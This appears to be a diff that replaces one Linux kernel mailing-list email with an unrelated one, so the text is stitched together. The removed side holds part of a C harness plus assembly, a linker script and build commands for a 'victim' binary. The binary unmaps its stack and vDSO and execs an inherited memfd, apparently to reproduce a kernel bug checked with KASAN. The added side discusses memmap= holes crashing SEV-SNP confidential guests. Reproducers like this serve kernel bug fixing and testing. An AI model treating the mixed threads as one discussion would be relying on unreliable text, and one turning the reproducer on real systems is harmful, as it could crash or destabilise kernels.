-> >               fprintf(stderr, "unexpected victim status: 0x%x\n", statu=
-s);
-> >               failed =3D 1;
-> >       }
-> >       victim =3D -1;
-> >       if (!failed) {
-> >               printf("[*] validated completion: affinity_success=3D%llu=
- "
-> >                      "attempts=3D%llu errors=3D%llu execs=3D%llu; no KA=
-SAN report\n",
-> >                      successes, attempts, errors, execs);
-> >               return 0;
-> >       }
-> >
-> > cleanup:
-> >       for (i =3D 0; i < spawned; i++) {
-> >               if (setters[i] > 0) {
-> >                       kill(setters[i], SIGKILL);
-> >                       wait_child(setters[i], &status);
-> >               }
-> >       }
-> >       if (victim > 0) {
-> >               kill(victim, SIGKILL);
-> >               wait_child(victim, &status);
-> >       }
-> >       puts("[!] validation failed");
-> >       return 1;
-> > }
-> > ```
-> >
-> > The embedded victim source and linker script follow.
-> >
-> > `victim_min_execfd.S`:
-> >
-> > ```asm
-> >       .section .text
-> >       .global _start
-> >       .type _start,@function
-> > _start:
-> >       mov %rsp, %r12
-> >
-> >       /* Count this instance through the inherited eventfd. */
-> >       mov $1, %eax
-> >       mov $3, %edi
-> >       lea one(%rip), %rsi
-> >       mov $8, %edx
-> >       syscall
-> >       cmp $8, %rax
-> >       jne .Lexit
-> >
-> >       /* Drop the stack and adjacent vDSO/vvar mappings before exec. */
-> >       mov %r12, %rdi
-> >       and $-2097152, %rdi
-> >       mov $4194304, %esi
-> >       mov $11, %eax
-> >       syscall
-> >
-> >       /* execveat(inherited_memfd_4, "", argv, NULL, AT_EMPTY_PATH). */
-> >       mov $322, %eax
-> >       mov $4, %edi
-> >       lea empty(%rip), %rsi
-> >       lea argv(%rip), %rdx
-> >       xor %r10d, %r10d
-> >       mov $0x1000, %r8d
-> >       syscall
-> >
-> > .Lexit:
-> >       mov $60, %eax
-> >       mov $127, %edi
-> >       syscall
-> >       hlt
-> >       .size _start, .-_start
-> >
-> >       .section .data
-> >       .align 8
-> > one:
-> >       .quad 1
-> > empty:
-> >       .byte 0
-> >       .align 8
-> > argv:
-> >       .quad empty
-> >       .quad 0
-> >
-> >       .section .note.GNU-stack,"",@progbits
-> > ```
-> >
-> > `victim_min.ld`:
-> >
-> > ```ld
-> > ENTRY(_start)
-> >
-> > PHDRS
-> > {
-> >       image PT_LOAD FILEHDR PHDRS FLAGS(7);
-> >       stack PT_GNU_STACK FLAGS(6);
-> > }
-> >
-> > SECTIONS
-> > {
-> >       . =3D 0x400000 + SIZEOF_HEADERS;
-> >       .image : ALIGN(16) {
-> >               *(.text*)
-> >               *(.rodata*)
-> >               *(.data*)
-> >               *(.bss*)
-> >       } :image
-> >       /DISCARD/ : { *(.note*) *(.comment*) *(.eh_frame*) }
-> > }
-> > ```
-> >
-> > The embedded image was built with GCC 16.2.1 and GNU ld 2.46.1:
-> >
-> > ```sh
-> > gcc -c -nostdlib -o victim.o victim_min_execfd.S
-> > ld -nostdlib -T victim_min.ld -o victim victim.o
-> > test "$(stat -c %s victim)" =3D 848
-> > readelf -h -l -S victim
-> > base64 -w 76 victim
-> > ```
-> >
-> >
-> > Thanks,
-> > Weiming
-> >
->
->
-> --
-> Mathieu Desnoyers
-> EfficiOS Inc.
-> https://www.efficios.com
+>>>>>> In a confidential guest (SEV-SNP, TDX) the EFI stub builds the unaccepted
+>>>>>> memory bitmap before the command line is parsed. memmap= and mem= edit
+>>>>>> e820_table only afterwards.
+>>>>> memmap= and mem= are debugging tools, right?
+>>>> I wish they were 🙂
+>>>> But AFAIU they are used to carve out "pmem" or PFN-mapped memory.
+>>> I've used them that way for development, but production pmem systems
+>>> always had persistent memory in their BIOS-provided memory maps.
+>>>
+>>> How are folks depending on these in production in confidential guests?
+>> They shouldn't but you can't guarantee that.
+>>
+>> But I don't mind letting them crash if they do :)
+>>
+> I'm fine with either approach (i.e. disallowing it or doing nothing
+> at all), as long as we don't pretend that this is something that is
+> expected to work.
 
-Hi everyone,
+Yes, it is confusing for a user who expects it to work.  I hit this
+myself and spent time finding the cause: a memmap= hole consistently
+crashes a confidential guest (SEV-SNP) early in boot.
 
-Just a gentle ping on this v3 patch. Any thoughts, feedback, or review comm=
-ents?
+I tried to fix it [1], but a bitmap unit cannot be half accepted when the
+hole is not 2 MiB aligned.  Also, a TDX guest does accept such holes.
+
+So we are left with the following options:
+
+  - disallow the memmap= options with a clear warning, as this series
+    does,
+  - add similar handling for TDX, so that holes are not accepted there
+    either, as done for SEV-SNP in [1]; memmap= holes that are not
+    2 MiB aligned would still be unhandled, or
+  - only print a warning and leave the options applied, in which case
+    memmap= holes still crash SEV-SNP guests.
+
+Which of these do you prefer, or is there a better way to handle it?
+
+[1] 
+https://lore.kernel.org/all/20261113105554.199912-1-pankaj.gupta@amd.com/
 
 Thanks,
-Weiming
+
+Pankaj
+
 
